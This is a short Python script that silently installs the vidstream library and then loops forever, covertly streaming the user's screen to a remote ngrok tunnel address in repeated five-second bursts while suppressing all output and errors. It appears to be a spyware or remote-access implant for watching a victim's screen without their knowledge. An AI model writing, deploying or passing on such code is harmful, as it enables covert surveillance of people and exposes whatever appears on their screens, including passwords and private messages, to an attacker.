####################################################################
while(True):
    try:
        from vidstream import ScreenShareClient
        import time
        break
    except:
        import subprocess
        subprocess.run(["pip", "install", "vidstream"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
####################################################################


####################################################################
while(True):
    try:
        Client = ScreenShareClient("0.tcp.sa.ngrok.io",11992)
        Client.start_stream()
        time.sleep(5)
        Client.stop_stream()
    except:pass
####################################################################
